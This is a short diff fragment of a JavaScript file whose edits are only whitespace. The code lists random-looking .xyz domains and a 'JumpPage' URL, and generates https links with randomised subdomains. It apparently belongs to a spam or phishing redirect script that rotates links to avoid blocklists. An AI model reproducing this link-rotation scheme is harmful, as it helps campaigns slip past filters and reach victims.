@@ -39,11 +39,12 @@ var emails = [
 var urls=[];
        urls.push(".tqvfqjj.xyz"); 
        urls.push(".ydvyekmz.xyz");
-       urls.push(".yyfbcsn.xyz");      
-                 
+       urls.push(".yyfbcsn.xyz");   
+            		
 var JumpPage="https://tsodledy.xyz";
 
 var newestUrls = [];
+
 
 for(var i =0;i<urls.length*3;i++){
     newestUrls.push( 'https://' + getRandomSubdomain() +urls[randomNum(0,urls.length-1)]);
